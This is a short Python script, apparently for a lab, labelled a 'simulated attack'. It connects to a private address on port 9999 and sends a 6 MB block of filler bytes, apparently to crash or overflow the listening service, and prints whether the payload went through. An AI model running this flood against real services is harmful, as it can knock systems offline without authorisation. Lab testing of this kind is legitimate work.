import socket

TARGET_IP = "192.168.209.140"
TARGET_PORT = 9999
PAYLOAD_SIZE = 6 * 1024 * 1024

def main():
    print(f"[*] Initiating simulated attack against {TARGET_IP}:{TARGET_PORT}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))
        
        payload = b"X" * PAYLOAD_SIZE
        s.sendall(payload)
        s.close()
        
        print(f"[SUCCESS] Payload of {PAYLOAD_SIZE} bytes delivered successfully.")
    except Exception as e:
        print(f"[BLOCKED] Connection failed or target is isolated: {e}")

if __name__ == "__main__":
    main()
